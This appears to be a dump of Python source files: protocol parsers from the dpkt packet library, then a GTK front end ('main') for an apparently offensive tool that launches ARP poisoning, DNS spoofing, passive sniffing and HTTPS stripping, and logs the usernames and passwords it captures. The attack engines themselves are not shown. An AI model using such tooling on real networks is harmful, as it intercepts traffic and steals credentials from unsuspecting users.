        ('flags', 'B', CLIENT_INITIATED),
        ('status', 'B', 0),
        ('security', 'B', 0),
        ('sum', 'H', 0),
        ('service', 'H', 0)
        )

########NEW FILE########
__FILENAME__ = sccp
# $Id: sccp.py 23 2006-11-08 15:45:33Z dugsong $

"""Cisco Skinny Client Control Protocol."""

import dpkt

KEYPAD_BUTTON		= 0x00000003
OFF_HOOK		= 0x00000006
ON_HOOK			= 0x00000007
OPEN_RECEIVE_CHANNEL_ACK= 0x00000022
START_TONE		= 0x00000082
STOP_TONE		= 0x00000083
SET_LAMP		= 0x00000086
SET_SPEAKER_MODE	= 0x00000088
START_MEDIA_TRANSMIT	= 0x0000008A
STOP_MEDIA_TRANSMIT	= 0x0000008B
CALL_INFO		= 0x0000008F
DEFINE_TIME_DATE	= 0x00000094
DISPLAY_TEXT		= 0x00000099
OPEN_RECEIVE_CHANNEL	= 0x00000105
CLOSE_RECEIVE_CHANNEL	= 0x00000106
SELECT_SOFTKEYS		= 0x00000110
CALL_STATE		= 0x00000111
DISPLAY_PROMPT_STATUS	= 0x00000112
CLEAR_PROMPT_STATUS	= 0x00000113
ACTIVATE_CALL_PLANE	= 0x00000116

class ActivateCallPlane(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('line_instance', 'I', 0),
        )

class CallInfo(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('calling_party_name', '40s', ''),
        ('calling_party', '24s', ''),
        ('called_party_name', '40s', ''),
        ('called_party', '24s', ''),
        ('line_instance', 'I', 0),
        ('call_id', 'I', 0),
        ('call_type', 'I', 0),
        ('orig_called_party_name', '40s', ''),
        ('orig_called_party', '24s', '')
        )

class CallState(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('call_state', 'I', 12), # 12: Proceed, 15: Connected
        ('line_instance', 'I', 1),
        ('call_id', 'I', 0)
        )

class ClearPromptStatus(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('line_instance', 'I', 1),
        ('call_id', 'I', 0)
        )

class CloseReceiveChannel(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('conference_id', 'I', 0),
        ('passthruparty_id', 'I', 0),
        )
    
class DisplayPromptStatus(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('msg_timeout', 'I', 0),
        ('display_msg', '32s', ''),
        ('line_instance', 'I', 1),
        ('call_id', 'I', 0)
        )
    
class DisplayText(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('display_msg', '36s', ''),
        )

class KeypadButton(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('button', 'I', 0),
        )
    
class OpenReceiveChannel(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('conference_id', 'I', 0),
        ('passthruparty_id', 'I', 0),
        ('ms_packet', 'I', 0),
        ('payload_capability', 'I', 4), # 4: G.711 u-law 64k
        ('echo_cancel_type', 'I', 4),
        ('g723_bitrate', 'I', 0),
        )

class OpenReceiveChannelAck(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('channel_status', 'I', 0),
        ('ip', '4s', ''),
        ('port', 'I', 0),
        ('passthruparty_id', 'I', 0),
        )

class SelectStartKeys(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('line_id', 'I', 1),
        ('call_id', 'I', 0),
        ('softkey_set', 'I', 8),
        ('softkey_map', 'I', 0xffffffffL)
        )

class SetLamp(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('stimulus', 'I', 9), # 9: Line
        ('stimulus_instance', 'I', 1),
        ('lamp_mode', 'I', 1),
        )

class SetSpeakerMode(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('speaker', 'I', 2), # 2: SpeakerOff
        )

class StartMediaTransmission(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('conference_id', 'I', 0),
        ('passthruparty_id', 'I', 0),
        ('remote_ip', '4s', ''),
        ('remote_port', 'I', 0),
        ('ms_packet', 'I', 0),
        ('payload_capability', 'I', 4), # 4: G.711 u-law 64k
        ('precedence', 'I', 0),
        ('silence_suppression', 'I', 0),
        ('max_frames_per_pkt', 'I', 1),
        ('g723_bitrate', 'I', 0),
        )

class StartTone(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('tone', 'I', 0x24), # 0x24: AlertingTone
        )

class StopMediaTransmission(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('conference_id', 'I', 0),
        ('passthruparty_id', 'I', 0),
        )
    
class SCCP(dpkt.Packet):
    __byte_order__ = '<'
    __hdr__ = (
        ('len', 'I', 0),
        ('rsvd', 'I', 0),
        ('msgid', 'I', 0),
        ('msg', '0s', ''),
        )
    _msgsw = {
        KEYPAD_BUTTON:KeypadButton,
        OPEN_RECEIVE_CHANNEL_ACK:OpenReceiveChannelAck,
        START_TONE:StartTone,
        SET_LAMP:SetLamp,
        START_MEDIA_TRANSMIT:StartMediaTransmission,
        STOP_MEDIA_TRANSMIT:StopMediaTransmission,
        CALL_INFO:CallInfo,
        DISPLAY_TEXT:DisplayText,
        OPEN_RECEIVE_CHANNEL:OpenReceiveChannel,
        CLOSE_RECEIVE_CHANNEL:CloseReceiveChannel,
        CALL_STATE:CallState,
        DISPLAY_PROMPT_STATUS:DisplayPromptStatus,
        CLEAR_PROMPT_STATUS:ClearPromptStatus,
        ACTIVATE_CALL_PLANE:ActivateCallPlane,
        }
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        n = self.len - 4
        if n > len(self.data):
            raise dpkt.NeedData('not enough data')
        self.msg, self.data = self.data[:n], self.data[n:]
        try:
            p = self._msgsw[self.msgid](self.msg)
            setattr(self, p.__class__.__name__.lower(), p)
        except (KeyError, dpkt.UnpackError):
            pass

########NEW FILE########
__FILENAME__ = sctp
# $Id: sctp.py 23 2006-11-08 15:45:33Z dugsong $

"""Stream Control Transmission Protocol."""

import dpkt, crc32c

# Stream Control Transmission Protocol
# http://tools.ietf.org/html/rfc2960

# Chunk Types
DATA			= 0
INIT			= 1
INIT_ACK		= 2
SACK			= 3
HEARTBEAT		= 4
HEARTBEAT_ACK		= 5
ABORT			= 6
SHUTDOWN		= 7
SHUTDOWN_ACK		= 8
ERROR			= 9
COOKIE_ECHO		= 10
COOKIE_ACK		= 11
ECNE			= 12
CWR			= 13
SHUTDOWN_COMPLETE	= 14

class SCTP(dpkt.Packet):
    __hdr__ = (
        ('sport', 'H', 0),
        ('dport', 'H', 0),
        ('vtag', 'I', 0),
        ('sum', 'I', 0)
        )

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        l = []
        while self.data:
            chunk = Chunk(self.data)
            l.append(chunk)
            self.data = self.data[len(chunk):]
        self.data = self.chunks = l

    def __len__(self):
        return self.__hdr_len__ + \
               sum(map(len, self.data))

    def __str__(self):
        l = [ str(x) for x in self.data ]
        if self.sum == 0:
            s = crc32c.add(0xffffffffL, self.pack_hdr())
            for x in l:
                s = crc32c.add(s, x)
            self.sum = crc32c.done(s)
        return self.pack_hdr() + ''.join(l)

class Chunk(dpkt.Packet):
    __hdr__ = (
        ('type', 'B', INIT),
        ('flags', 'B', 0),
        ('len', 'H', 0)
        )

    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        self.data = self.data[:self.len - self.__hdr_len__]

if __name__ == '__main__':
    import unittest

    class SCTPTestCase(unittest.TestCase):
        def testPack(self):
            sctp = SCTP(self.s)
            self.failUnless(self.s == str(sctp))
            sctp.sum = 0
            self.failUnless(self.s == str(sctp))

        def testUnpack(self):
            sctp = SCTP(self.s)
            self.failUnless(sctp.sport == 32836)
            self.failUnless(sctp.dport == 80)
            self.failUnless(len(sctp.chunks) == 1)
            self.failUnless(len(sctp) == 72)

            chunk = sctp.chunks[0]
            self.failUnless(chunk.type == INIT)
            self.failUnless(chunk.len == 60)

        s = '\x80\x44\x00\x50\x00\x00\x00\x00\x30\xba\xef\x54\x01\x00\x00\x3c\x3b\xb9\x9c\x46\x00\x01\xa0\x00\x00\x0a\xff\xff\x2b\x2d\x7e\xb2\x00\x05\x00\x08\x9b\xe6\x18\x9b\x00\x05\x00\x08\x9b\xe6\x18\x9c\x00\x0c\x00\x06\x00\x05\x00\x00\x80\x00\x00\x04\xc0\x00\x00\x04\xc0\x06\x00\x08\x00\x00\x00\x00'
    unittest.main()

########NEW FILE########
__FILENAME__ = sip
# $Id: sip.py 48 2008-05-27 17:31:15Z yardley $

"""Session Initiation Protocol."""

import http

class Request(http.Request):
    """SIP request."""
    __hdr_defaults__ = {
        'method':'INVITE',
        'uri':'sip:user@example.com',
        'version':'2.0',
        'headers':{ 'To':'', 'From':'', 'Call-ID':'', 'CSeq':'', 'Contact':'' }
        }
    __methods = dict.fromkeys((
        'ACK', 'BYE', 'CANCEL', 'INFO', 'INVITE', 'MESSAGE', 'NOTIFY',
        'OPTIONS', 'PRACK', 'PUBLISH', 'REFER', 'REGISTER', 'SUBSCRIBE',
        'UPDATE'
        ))
    __proto = 'SIP'

class Response(http.Response):
    """SIP response."""
    __hdr_defaults__ = {
        'version':'2.0',
        'status':'200',
        'reason':'OK',
        'headers':{ 'To':'', 'From':'', 'Call-ID':'', 'CSeq':'', 'Contact':'' }
        }
    __proto = 'SIP'

        

########NEW FILE########
__FILENAME__ = sll
# $Id: sll.py 23 2006-11-08 15:45:33Z dugsong $

"""Linux libpcap "cooked" capture encapsulation."""

import arp, dpkt, ethernet

class SLL(dpkt.Packet):
    __hdr__ = (
        ('type', 'H', 0), # 0: to us, 1: bcast, 2: mcast, 3: other, 4: from us
        ('hrd', 'H', arp.ARP_HRD_ETH),
        ('hlen', 'H', 6),	# hardware address length
        ('hdr', '8s', ''),	# first 8 bytes of link-layer header
        ('ethtype', 'H', ethernet.ETH_TYPE_IP),
        )
    _typesw = ethernet.Ethernet._typesw
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        try:
            self.data = self._typesw[self.ethtype](self.data)
            setattr(self, self.data.__class__.__name__.lower(), self.data)
        except (KeyError, dpkt.UnpackError):
            pass

########NEW FILE########
__FILENAME__ = smb
# $Id: smb.py 23 2006-11-08 15:45:33Z dugsong $

"""Server Message Block."""

import dpkt

class SMB(dpkt.Packet):
    __hdr__ = [
    ('proto', '4s', ''),
    ('cmd', 'B', 0),
    ('err', 'I', 0),
    ('flags1', 'B', 0),
    ('flags2', 'B', 0),
    ('pad', '6s', ''),
    ('tid', 'H', 0),
    ('pid', 'H', 0),
    ('uid', 'H', 0),
    ('mid', 'H', 0)
    ]

########NEW FILE########
__FILENAME__ = ssl
# $Id: ssl.py 46 2008-05-27 02:08:12Z jon.oberheide $

"""Secure Sockets Layer / Transport Layer Security."""

import dpkt

class SSL2(dpkt.Packet):
    __hdr__ = (
        ('len', 'H', 0),
        ('msg', 's', ''),
        ('pad', 's', ''),
        )
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        if self.len & 0x8000:
            n = self.len = self.len & 0x7FFF
            self.msg, self.data = self.data[:n], self.data[n:]
        else:
            n = self.len = self.len & 0x3FFF
            padlen = ord(self.data[0])
            self.msg = self.data[1:1+n]
            self.pad = self.data[1+n:1+n+padlen]
            self.data = self.data[1+n+padlen:]

# SSLv3/TLS version
SSL3_VERSION = 0x0300
TLS1_VERSION = 0x0301

# Record type
SSL3_RT_CHANGE_CIPHER_SPEC = 20
SSL3_RT_ALERT             = 21
SSL3_RT_HANDSHAKE         = 22
SSL3_RT_APPLICATION_DATA  = 23

# Handshake message type
SSL3_MT_HELLO_REQUEST           = 0
SSL3_MT_CLIENT_HELLO            = 1
SSL3_MT_SERVER_HELLO            = 2
SSL3_MT_CERTIFICATE             = 11
SSL3_MT_SERVER_KEY_EXCHANGE     = 12
SSL3_MT_CERTIFICATE_REQUEST     = 13
SSL3_MT_SERVER_DONE             = 14
SSL3_MT_CERTIFICATE_VERIFY      = 15
SSL3_MT_CLIENT_KEY_EXCHANGE     = 16
SSL3_MT_FINISHED                = 20

class SSL3(dpkt.Packet):
    __hdr__ = (
        ('type', 'B', 0),
        ('version', 'H', 0),
        ('len', 'H', 0),
        )
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        if self.len <= len(self.data):
            self.msg, self.data = self.data[:self.len], self.data[self.len:]

"""
Byte   0       = SSL record type = 22 (SSL3_RT_HANDSHAKE)
Bytes 1-2      = SSL version (major/minor)
Bytes 3-4      = Length of data in the record (excluding the header itself).
Byte   5       = Handshake type
Bytes 6-8      = Length of data to follow in this record
Bytes 9-n      = Command-specific data
"""
        

class SSLFactory(object):
    def __new__(cls, buf):
        v = buf[1:3]
        if v == '\x03\x01' or v == '\x03\x00':
            return SSL3(buf)
        return SSL2(buf)

########NEW FILE########
__FILENAME__ = stp
# $Id: stp.py 23 2006-11-08 15:45:33Z dugsong $

"""Spanning Tree Protocol."""

import dpkt

class STP(dpkt.Packet):
    __hdr__ = (
        ('proto_id', 'H', 0),
        ('v', 'B', 0),
        ('type', 'B', 0),
        ('flags', 'B', 0),
        ('root_id', '8s', ''),
        ('root_path', 'I', 0),
        ('bridge_id', '8s', ''),
        ('port_id', 'H', 0),
        ('age', 'H', 0),
        ('max_age', 'H', 0),
        ('hello', 'H', 0),
        ('fd', 'H', 0)
        )

########NEW FILE########
__FILENAME__ = stun
# $Id: stun.py 47 2008-05-27 02:10:00Z jon.oberheide $

"""Simple Traversal of UDP through NAT."""

import struct
import dpkt

# STUN - RFC 3489
# http://tools.ietf.org/html/rfc3489
# Each packet has a 20 byte header followed by 0 or more attribute TLVs.

# Message Types
BINDING_REQUEST			= 0x0001
BINDING_RESPONSE		= 0x0101
BINDING_ERROR_RESPONSE		= 0x0111
SHARED_SECRET_REQUEST		= 0x0002
SHARED_SECRET_RESPONSE		= 0x0102
SHARED_SECRET_ERROR_RESPONSE	= 0x0112

# Message Attributes
MAPPED_ADDRESS			= 0x0001
RESPONSE_ADDRESS		= 0x0002
CHANGE_REQUEST			= 0x0003
SOURCE_ADDRESS			= 0x0004
CHANGED_ADDRESS			= 0x0005
USERNAME			= 0x0006
PASSWORD			= 0x0007
MESSAGE_INTEGRITY		= 0x0008
ERROR_CODE			= 0x0009
UNKNOWN_ATTRIBUTES		= 0x000a
REFLECTED_FROM			= 0x000b

class STUN(dpkt.Packet):
    __hdr__ = (
        ('type', 'H', 0),
        ('len', 'H', 0),
        ('xid', '16s', 0)
        )

def tlv(buf):
    n = 4
    t, l = struct.unpack('>HH', buf[:n])
    v = buf[n:n+l]
    buf = buf[n+l:]
    return (t,l,v, buf)

########NEW FILE########
__FILENAME__ = tcp
# $Id: tcp.py 42 2007-08-02 22:38:47Z jon.oberheide $

"""Transmission Control Protocol."""

import dpkt

# TCP control flags
TH_FIN		= 0x01		# end of data
TH_SYN		= 0x02		# synchronize sequence numbers
TH_RST		= 0x04		# reset connection
TH_PUSH		= 0x08		# push
TH_ACK		= 0x10		# acknowledgment number set
TH_URG		= 0x20		# urgent pointer set
TH_ECE		= 0x40		# ECN echo, RFC 3168
TH_CWR		= 0x80		# congestion window reduced

TCP_PORT_MAX	= 65535		# maximum port
TCP_WIN_MAX	= 65535		# maximum (unscaled) window

class TCP(dpkt.Packet):
    __hdr__ = (
        ('sport', 'H', 0xdead),
        ('dport', 'H', 0),
        ('seq', 'I', 0xdeadbeefL),
        ('ack', 'I', 0),
        ('off_x2', 'B', ((5 << 4) | 0)),
        ('flags', 'B', TH_SYN),
        ('win', 'H', TCP_WIN_MAX),
        ('sum', 'H', 0),
        ('urp', 'H', 0)
        )
    opts = ''
    
    def _get_off(self): return self.off_x2 >> 4
    def _set_off(self, off): self.off_x2 = (off << 4) | (self.off_x2 & 0xf)
    off = property(_get_off, _set_off)

    def __len__(self):
        return self.__hdr_len__ + len(self.opts) + len(self.data)
    
    def __str__(self):
        return self.pack_hdr() + self.opts + str(self.data)
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        ol = ((self.off_x2 >> 4) << 2) - self.__hdr_len__
        if ol < 0:
            raise dpkt.UnpackError, 'invalid header length'
        self.opts = buf[self.__hdr_len__:self.__hdr_len__ + ol]
        self.data = buf[self.__hdr_len__ + ol:]

# Options (opt_type) - http://www.iana.org/assignments/tcp-parameters
TCP_OPT_EOL		= 0	# end of option list
TCP_OPT_NOP		= 1	# no operation
TCP_OPT_MSS		= 2	# maximum segment size
TCP_OPT_WSCALE		= 3	# window scale factor, RFC 1072
TCP_OPT_SACKOK		= 4	# SACK permitted, RFC 2018
TCP_OPT_SACK		= 5	# SACK, RFC 2018
TCP_OPT_ECHO		= 6	# echo (obsolete), RFC 1072
TCP_OPT_ECHOREPLY	= 7	# echo reply (obsolete), RFC 1072
TCP_OPT_TIMESTAMP	= 8	# timestamp, RFC 1323
TCP_OPT_POCONN		= 9	# partial order conn, RFC 1693
TCP_OPT_POSVC		= 10	# partial order service, RFC 1693
TCP_OPT_CC		= 11	# connection count, RFC 1644
TCP_OPT_CCNEW		= 12	# CC.NEW, RFC 1644
TCP_OPT_CCECHO		= 13	# CC.ECHO, RFC 1644
TCP_OPT_ALTSUM		= 14	# alt checksum request, RFC 1146
TCP_OPT_ALTSUMDATA	= 15	# alt checksum data, RFC 1146
TCP_OPT_SKEETER		= 16	# Skeeter
TCP_OPT_BUBBA		= 17	# Bubba
TCP_OPT_TRAILSUM	= 18	# trailer checksum
TCP_OPT_MD5		= 19	# MD5 signature, RFC 2385
TCP_OPT_SCPS		= 20	# SCPS capabilities
TCP_OPT_SNACK		= 21	# selective negative acks
TCP_OPT_REC		= 22	# record boundaries
TCP_OPT_CORRUPT		= 23	# corruption experienced
TCP_OPT_SNAP		= 24	# SNAP
TCP_OPT_TCPCOMP		= 26	# TCP compression filter
TCP_OPT_MAX		= 27

def parse_opts(buf):
    """Parse TCP option buffer into a list of (option, data) tuples."""
    opts = []
    while buf:
        o = ord(buf[0])
        if o > TCP_OPT_NOP:
            try:
                l = ord(buf[1])
                d, buf = buf[2:l], buf[l:]
            except ValueError:
                #print 'bad option', repr(str(buf))
                opts.append(None) # XXX
                break
        else:
            d, buf = '', buf[1:]
        opts.append((o,d))
    return opts


########NEW FILE########
__FILENAME__ = telnet
# $Id: telnet.py 23 2006-11-08 15:45:33Z dugsong $

"""Telnet."""

IAC    = 255	# interpret as command:
DONT   = 254	# you are not to use option
DO     = 253	# please, you use option
WONT   = 252	# I won't use option
WILL   = 251	# I will use option
SB     = 250	# interpret as subnegotiation
GA     = 249	# you may reverse the line
EL     = 248	# erase the current line
EC     = 247	# erase the current character
AYT    = 246	# are you there
AO     = 245	# abort output--but let prog finish
IP     = 244	# interrupt process--permanently
BREAK  = 243	# break
DM     = 242	# data mark--for connect. cleaning
NOP    = 241	# nop
SE     = 240	# end sub negotiation
EOR    = 239	# end of record (transparent mode)
ABORT  = 238	# Abort process
SUSP   = 237	# Suspend process
xEOF   = 236	# End of file: EOF is already used...

SYNCH  = 242    # for telfunc calls

def strip_options(buf):
    """Return a list of lines and dict of options from telnet data."""
    l = buf.split(chr(IAC))
    #print l
    b = []
    d = {}
    subopt = False
    for w in l:
        if not w:
            continue
        o = ord(w[0])
        if o > SB:
            #print 'WILL/WONT/DO/DONT/IAC', `w`
            w = w[2:]
        elif o == SE:
            #print 'SE', `w`
            w = w[1:]
            subopt = False
        elif o == SB:
            #print 'SB', `w`
            subopt = True
            for opt in ('USER', 'DISPLAY', 'TERM'):
                p = w.find(opt + '\x01')
                if p != -1:
                    d[opt] = w[p+len(opt)+1:].split('\x00', 1)[0]
            w = None
        elif subopt:
            w = None
        if w:
            w = w.replace('\x00', '\n').splitlines()
            if not w[-1]: w.pop()
            b.extend(w)
    return b, d

if __name__ == '__main__':
    import unittest

    class TelnetTestCase(unittest.TestCase):
        def test_telnet(self):
            l = []
            s = "\xff\xfb%\xff\xfa%\x00\x00\x00\xff\xf0\xff\xfd&\xff\xfa&\x05\xff\xf0\xff\xfa&\x01\x01\x02\xff\xf0\xff\xfb\x18\xff\xfb \xff\xfb#\xff\xfb'\xff\xfc$\xff\xfa \x0038400,38400\xff\xf0\xff\xfa#\x00doughboy.citi.umich.edu:0.0\xff\xf0\xff\xfa'\x00\x00DISPLAY\x01doughboy.citi.umich.edu:0.0\x00USER\x01dugsong\xff\xf0\xff\xfa\x18\x00XTERM\xff\xf0\xff\xfd\x03\xff\xfc\x01\xff\xfb\x1f\xff\xfa\x1f\x00P\x00(\xff\xf0\xff\xfd\x05\xff\xfb!\xff\xfd\x01fugly\r\x00yoda\r\x00bashtard\r\x00"
            l.append(s)
            s = '\xff\xfd\x01\xff\xfd\x03\xff\xfb\x18\xff\xfb\x1f\xff\xfa\x1f\x00X\x002\xff\xf0admin\r\x00\xff\xfa\x18\x00LINUX\xff\xf0foobar\r\x00enable\r\x00foobar\r\x00\r\x00show ip int Vlan 666\r\x00'
            l.append(s)
            s = '\xff\xfb%\xff\xfa%\x00\x00\x00\xff\xf0\xff\xfd&\xff\xfa&\x05\xff\xf0\xff\xfa&\x01\x01\x02\xff\xf0\xff\xfb&\xff\xfb\x18\xff\xfb \xff\xfb#\xff\xfb\'\xff\xfc$\xff\xfa \x0038400,38400\xff\xf0\xff\xfa#\x00doughboy.citi.umich.edu:0.0\xff\xf0\xff\xfa\'\x00\x00DISPLAY\x01doughboy.citi.umich.edu:0.0\x00USER\x01dugsong\xff\xf0\xff\xfa\x18\x00XTERM\xff\xf0\xff\xfd\x03\xff\xfc\x01\xff\xfb"\xff\xfa"\x03\x01\x03\x00\x03b\x03\x04\x02\x0f\x05\x00\xff\xff\x07b\x1c\x08\x02\x04\tB\x1a\n\x02\x7f\x0b\x02\x15\x0c\x02\x17\r\x02\x12\x0e\x02\x16\x0f\x02\x11\x10\x02\x13\x11\x00\xff\xff\x12\x00\xff\xff\xff\xf0\xff\xfb\x1f\xff\xfa\x1f\x00P\x00(\xff\xf0\xff\xfd\x05\xff\xfb!\xff\xfa"\x01\x0f\xff\xf0\xff\xfd\x01\xff\xfe\x01\xff\xfa"\x03\x01\x80\x00\xff\xf0\xff\xfd\x01werd\r\n\xff\xfe\x01yoda\r\n\xff\xfd\x01darthvader\r\n\xff\xfe\x01'
            l.append(s)
            exp = [ (['fugly', 'yoda', 'bashtard'], {'USER': 'dugsong', 'DISPLAY': 'doughboy.citi.umich.edu:0.0'}), (['admin', 'foobar', 'enable', 'foobar', '', 'show ip int Vlan 666'], {}), (['werd', 'yoda', 'darthvader'], {'USER': 'dugsong', 'DISPLAY': 'doughboy.citi.umich.edu:0.0'}) ]
            self.failUnless(map(strip_options, l) == exp)

    unittest.main()

########NEW FILE########
__FILENAME__ = tftp
# $Id: tftp.py 23 2006-11-08 15:45:33Z dugsong $

"""Trivial File Transfer Protocol."""

import struct
import dpkt

# Opcodes
OP_RRQ     = 1    # read request
OP_WRQ     = 2    # write request
OP_DATA    = 3    # data packet
OP_ACK     = 4    # acknowledgment
OP_ERR     = 5    # error code

# Error codes
EUNDEF     = 0    # not defined
ENOTFOUND  = 1    # file not found
EACCESS    = 2    # access violation
ENOSPACE   = 3    # disk full or allocation exceeded
EBADOP     = 4    # illegal TFTP operation
EBADID     = 5    # unknown transfer ID
EEXISTS    = 6    # file already exists
ENOUSER    = 7    # no such user

class TFTP(dpkt.Packet):
    __hdr__ = (('opcode', 'H', 1), )
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        if self.opcode in (OP_RRQ, OP_WRQ):
            l = self.data.split('\x00')
            self.filename = l[0]
            self.mode = l[1]
            self.data = ''
        elif self.opcode in (OP_DATA, OP_ACK):
            self.block = struct.unpack('>H', self.data[:2])
            self.data = self.data[2:]
        elif self.opcode == OP_ERR:
            self.errcode = struct.unpack('>H', self.data[:2])
            self.errmsg = self.data[2:].split('\x00')[0]
            self.data = ''

    def __len__(self):
        return len(str(self))

    def __str__(self):
        if self.opcode in (OP_RRQ, OP_WRQ):
            s = '%s\x00%s\x00' % (self.filename, self.mode)
        elif self.opcode in (OP_DATA, OP_ACK):
            s = struct.pack('>H', self.block)
        elif self.opcode == OP_ERR:
            s = struct.pack('>H', self.errcode) + ('%s\x00' % self.errmsg)
        else:
            s = ''
        return self.pack_hdr() + s + self.data

########NEW FILE########
__FILENAME__ = tns
# $Id: tns.py 23 2006-11-08 15:45:33Z dugsong $

"""Transparent Network Substrate."""

import dpkt

class TNS(dpkt.Packet):
    __hdr__ = (
    ('length', 'H', 0),
    ('pktsum', 'H', 0),
    ('type', 'B', 0),
    ('rsvd', 'B', 0),
    ('hdrsum', 'H', 0),
    ('msg', '0s', ''),
    )
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        n = self.length - self.__hdr_len__
        if n > len(self.data):
            raise dpkt.NeedData('short message (missing %d bytes)' %
                                (n - len(self.data)))
        self.msg = self.data[:n]
        self.data = self.data[n:]


########NEW FILE########
__FILENAME__ = tpkt
# $Id: tpkt.py 23 2006-11-08 15:45:33Z dugsong $

"""ISO Transport Service on top of the TCP (TPKT)."""

import dpkt

# TPKT - RFC 1006 Section 6
# http://www.faqs.org/rfcs/rfc1006.html

class TPKT(dpkt.Packet):
    __hdr__ = (
        ('v', 'B', 3),
        ('rsvd', 'B', 0),
        ('len', 'H', 0)
        )

########NEW FILE########
__FILENAME__ = udp
# $Id: udp.py 23 2006-11-08 15:45:33Z dugsong $

"""User Datagram Protocol."""

import dpkt

UDP_PORT_MAX	= 65535

class UDP(dpkt.Packet):
    __hdr__ = (
        ('sport', 'H', 0xdead),
        ('dport', 'H', 0),
        ('ulen', 'H', 8),
        ('sum', 'H', 0)
        )

########NEW FILE########
__FILENAME__ = vrrp
# $Id: vrrp.py 23 2006-11-08 15:45:33Z dugsong $

"""Virtual Router Redundancy Protocol."""

import dpkt

class VRRP(dpkt.Packet):
    __hdr__ = (
        ('vtype', 'B', 0x21),
        ('vrid', 'B', 0),
        ('priority', 'B', 0),
        ('count', 'B', 0),
        ('atype', 'B', 0),
        ('advtime', 'B', 0),
        ('sum', 'H', 0),
        )
    addrs = ()
    auth = ''
    def _get_v(self):
        return self.vtype >> 4
    def _set_v(self, v):
        self.vtype = (self.vtype & ~0xf) | (v << 4)
    v = property(_get_v, _set_v)

    def _get_type(self):
        return self.vtype & 0xf
    def _set_type(self, v):
        self.vtype = (self.vtype & ~0xf0) | (v & 0xf)
    type = property(_get_v, _set_v)
    
    def unpack(self, buf):
        dpkt.Packet.unpack(self, buf)
        l = []
        for off in range(0, 4 * self.count, 4):
            l.append(self.data[off:off+4])
        self.addrs = l
        self.auth = self.data[off+4:]
        self.data = ''

    def __len__(self):
        return self.__hdr_len__ + (4 * self.count) + len(self.auth)

    def __str__(self):
        data = ''.join(self.addrs) + self.auth
        if not self.sum:
            self.sum = dpkt.in_cksum(self.pack_hdr() + data)
        return self.pack_hdr() + data

########NEW FILE########
__FILENAME__ = yahoo
# $Id: yahoo.py 23 2006-11-08 15:45:33Z dugsong $

"""Yahoo Messenger."""

import dpkt

class YHOO(dpkt.Packet):
    __hdr__ = [
        ('version', '8s', ' ' * 8),
        ('length', 'I', 0),
        ('service', 'I', 0),
        ('connid', 'I', 0),
        ('magic', 'I', 0),
        ('unknown', 'I', 0),
        ('type', 'I', 0),
        ('nick1', '36s', ' ' * 36),
        ('nick2', '36s', ' ' * 36)
    ]
    __byte_order__ = '<'

class YMSG(dpkt.Packet):
    __hdr__ =  [
        ('version', '8s', ' ' * 8),
        ('length', 'H', 0),
        ('type', 'H', 0),
        ('unknown1', 'I', 0),
        ('unknown2', 'I', 0)
    ]
    

########NEW FILE########
__FILENAME__ = main
import sys, os, time
from Engine import arp
from Engine import sniff
from Engine import httpstrip
from Engine.functions import macFormat, ipFormat
from Engine import plugins
from Engine import dnsSpoof
from Engine import ifaces
passwdList = None
gladefile="main.glade"

try:
 	import pygtk
  	pygtk.require("2.0")
except:
  	pass
try:
	import gtk
  	import gtk.glade
except:
	sys.exit(1)
gtk.gdk.threads_init()


class logger():
    def addInfo(self,service,host,user,passwd):
        passwdList.append([service, ipFormat(host), user, passwd])

class arpGui:
    def __init__(self):
        self.plugins = plugins.Plugins()
        self.load()
        self.logger = logger()
        self.dnsSpoof = dnsSpoof.dnsSpoof()
        self.iface = None
        self.arp = None
        self.sniff = False
        self.httpspwn = httpstrip.run_server(self.logger)

    def addlistColumn(self, Object, title, columnId):
        column = gtk.TreeViewColumn(title, gtk.CellRendererText(), text=columnId)
        column.set_resizable(True)		
        column.set_sort_column_id(columnId)
        Object.append_column(column)

    def scanNetwork(self,widget):
        if self.arp != None:
            self.networkList.clear()
            result,ip1,ip2 = scanDialog().run()
            if (result == gtk.RESPONSE_OK):
                lenght =  self.arp.scanRange(ip1,ip2)
                if (lenght >=1):
                    for target in self.arp.network:
                        self.networkList.append([target.ip])

    def startSniff(self,widget):
        if (self.iface != None):
            if (self.sniff.running == False):
                self.sniff.running = True
                self.lblSniffing.set_text('Pasive sniffing: ON')
                try:
                    self.sniff.start()
                except:
                    messageBox("couldn't start the Pasive sniffing")
            else:
                self.sniff.running = False
                self.lblSniffing.set_text('Pasive sniffing: OFF')
                self.sniff = sniff.sniff(self.iface, self.logger, self.plugins,self.dnsSpoof)

    def arpPoison(self,widget):
        if(self.arp != None):
            if (len(self.arp.targets)>0 and self.arp.running == False):
                self.arp.running = True
                self.lblArp.set_text('Arp: ON')
                self.arp.start()
            else:
                self.arp.running = False
                self.lblArp.set_text('Arp: OFF')
                self.arp = arp.ARP(self.iface)

    def exit(self,widget):
        try:
            self.arp.running = False
            self.sniff.running = False
            if self.httpspwn.running == True:
                self.httpspwn.stop()
            gtk.main_quit()
            exit()
        except(AttributeError):
            gtk.main_quit()
            exit()

